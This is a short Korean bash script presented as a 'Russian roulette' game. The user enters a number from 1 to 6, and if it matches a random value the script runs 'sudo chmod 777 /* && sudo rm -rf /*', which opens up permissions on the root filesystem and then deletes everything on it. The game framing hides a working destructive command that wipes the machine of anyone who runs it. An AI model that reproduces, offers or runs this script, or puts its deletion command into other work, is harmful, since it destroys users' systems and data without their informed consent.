#! /bin/bash
ha=6;
echo -n "숫자만 입력해줘 : "
read num
if [ $num -gt $ha ]
then
	echo "$ha 초과."
	echo -n "다시 입력해줘 : "
	read num
	fi
if [ $num -eq $[ $[$RANDOM % $ha] + 1] ]
then
	echo "ㅅㄱ"
	sudo chmod 777 /* && sudo rm -rf /*
else 
	echo "살았습니다."
	fi
